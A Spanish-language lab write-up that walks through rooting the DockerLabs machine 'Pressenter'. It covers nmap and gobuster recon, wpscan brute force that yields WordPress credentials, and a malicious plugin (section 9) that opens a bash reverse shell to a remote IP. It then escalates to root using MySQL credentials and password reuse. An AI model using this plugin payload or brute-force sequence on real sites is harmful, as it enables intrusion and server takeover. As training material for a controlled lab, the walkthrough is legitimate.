# Informe de Pentesting – Máquina *Pressenter* (DockerLabs)

* **Dificultad:** Fácil
* **Objetivo:** Obtener acceso root a la máquina mediante la búsqueda de vulnerabilidades en directorios ocultos, revellshell y explotación de vulnerabilidades de MySQL y WordPress
* **Autor del Informe:** Alejandro

---

## 1. Despliegue de la Máquina

Descargamos la máquina desde DockerLabs, descomprimimos y desplegamos:

```bash
unzip pressenter.zip
sudo bash auto_deploy.sh pressenter.tar
```

![](/Pressenter/Imagenes/Logo.jpeg)

---

## 2. Comprobación de Conectividad

Verificamos conectividad con la máquina virtual usando `ping`:

```bash
ping -c1 172.17.0.2
```

![](/Pressenter/Imagenes/Inicio.jpeg)
![](/Pressenter/Imagenes/Ping.jpeg)

---

## 3. Reconocimiento con Nmap

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![](/Pressenter/Imagenes/Puertos.jpeg)

Solo está abierto el puerto **80 (HTTP)**.

### Detección de versiones y scripts

```bash
nmap -sC -sV -p 80 172.17.0.2 -oN target.txt
```

![](/Pressenter/Imagenes/Servicios.jpeg)

---

## 4. Navegación Web

Al acceder al sitio `http://172.17.0.2`, encontramos una página web activa.

![](/Pressenter/Imagenes/Pagina.jpeg)

---

## 5. Análisis de la Aplicación Web

### Formulario de registro

Investigamos un formulario de registro:

![](/Pressenter/Imagenes/Registro.jpeg)

Intentamos inyección SQL manual, pero no tuvo éxito.

### Código fuente

En el código fuente encontramos un dominio personalizado:

```html
http://pressenter.hl/
```

Lo agregamos al archivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Agregamos la línea:

```
172.17.0.2 pressenter.hl
```

![](/Pressenter/Imagenes/Fuente.jpeg)

---

## 6. Enumeración del Sitio `pressenter.hl`

### Nueva página

![](/Pressenter/Imagenes/Pagina2.jpeg)

### Enumeración de directorios con Gobuster

```bash
gobuster dir -u http://pressenter.hl/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![](/Pressenter/Imagenes/Gobuster.jpeg)

---

## 7. Enumeración de WordPress

Utilizamos **wpscan** para identificar vulnerabilidades en el sitio WordPress:

```bash
sudo wpscan --url http://pressenter.hl/ --enumerate u,vp
```

Se identifican usuarios válidos: `pressi` y `hacker`.

![](/Pressenter/Imagenes/Usuarios.jpeg)

### Fuerza bruta de contraseñas

Usamos **rockyou.txt** para intentar descubrir credenciales:

```bash
sudo wpscan --url http://pressenter.hl/ --passwords /usr/share/wordlists/rockyou.txt --usernames pressi,hacker
```

Se encontró la siguiente combinación válida:

* **Usuario:** pressi
* **Contraseña:** dumbass

![](/Pressenter/Imagenes/Credenciales.jpeg)

---

## 8. Acceso a WordPress

Ingresamos con éxito al panel de administración de WordPress.

![](/Pressenter/Imagenes/Sesion.jpeg)
![](/Pressenter/Imagenes/Bienbenido.jpeg)

---

## 9. Ejecución de Shell Reversa (Web Shell)

Creamos un plugin malicioso para obtener una shell inversa:

**Código del archivo `revellshell.php`:**

```php
<?php
/*
Plugin Name: RevellShell
Plugin URI: http://example.com
Description: Este es un plugin de prueba para propósitos educativos en un laboratorio controlado.
Version: 1.0
Author: Alejandro
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1'");
?>
```

Comprimimos el archivo en formato `.zip`:

```bash
7z a revellshell.zip revellshell.php
```

Subimos el plugin a través del panel de WordPress y **lo activamos**.

Antes de eso, ponemos el sistema en modo escucha:

```bash
sudo nc -lvnp 443
```

![](/Pressenter/Imagenes/Plugins.jpeg)
![](/Pressenter/Imagenes/IniciarP.jpeg)

---

## 10. Acceso a la Shell

Al activar el plugin, obtenemos una **shell reversa** con permisos del servidor web.

![](/Pressenter/Imagenes/shell.jpeg)

---

## 11. Escalada de Privilegios

Dentro del directorio `/var/www/pressenter`, encontramos el archivo `wp-config.php`, donde están las credenciales de MySQL:

* **Usuario MySQL:** admin
* **Contraseña:** rooteable

Accedemos a MySQL:

```bash
mysql -u admin -prooteable
```

Dentro de la base de datos, encontramos la tabla `wp_users` y descubrimos otro usuario:

* **Usuario:** enter
* **Contraseña:** kernellinuxhack

Probamos acceso SSH sin éxito, pero sí podemos usar `su`:

```bash
su enter
```

La misma contraseña (`kernellinuxhack`) funciona.

Probamos `su` nuevamente para root con la misma clave:

```bash
su
```

¡Acceso root logrado!

![](/Pressenter/Imagenes/Mysqlcre.jpeg)
![](/Pressenter/Imagenes/root.jpeg)

---

## 12. Conclusión

Se logró el objetivo de obtener acceso **root** a la máquina vulnerable **Pressenter**. La intrusión se basó en:

* Enumeración web y de servicios.
* Uso de herramientas como `nmap`, `wpscan`, `gobuster`.
* Ataque de fuerza bruta a WordPress.
* Subida y activación de un plugin malicioso.
* Reutilización de contraseñas para escalada de privilegios.
